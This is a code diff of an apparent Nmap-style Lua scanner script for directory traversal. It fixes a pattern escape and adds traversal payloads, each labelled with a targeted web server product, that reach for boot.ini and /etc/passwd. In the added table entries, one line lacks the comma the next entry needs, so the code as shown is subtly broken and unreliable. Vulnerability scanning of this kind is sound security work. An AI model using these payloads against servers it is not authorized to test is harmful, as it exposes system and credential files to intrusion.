@@ -62,9 +62,8 @@ local validate = function(response)
 		return nil
 	end
 
-	if response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") or response.body:match("\[boot loader\]") then
-													  return response.body
-	
+	if response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") or response.body:match("%[boot loader%]") then
+		return response.body
 	end
 
 	return nil
@@ -117,14 +116,25 @@ action = function(host, port)
 
 		-- These don't get hexified because they are targeted at
 		-- specific known vulnerabilities.
+		'..\\\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
+		--miniwebsvr
 		'%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini',
 		'%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini',
+		--Acritum Femitter Server
 		'\\\\..%2f..%2f..%2f..%2fboot.ini% ../',
+		--zervit Web Server and several others
 		'index.html?../../../../../boot.ini',
 		'index.html?..\\..\\..\\..\\..\\boot.ini',
-		'..\\\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
+		--Mongoose Web Server
 		'///..%2f..%2f..%2f..%2fboot.ini',
 		'/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini'
+		--MultiThreaded HTTP Server v1.1
+		'/..\\..\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
+		--uHttp Server
+		'/../../../../../../../etc/passwd',
+		--Java Mini Web Server
+		'/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini',
+		'/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fpasswd',
 	}
 
 	for _, dir in ipairs(dirs) do
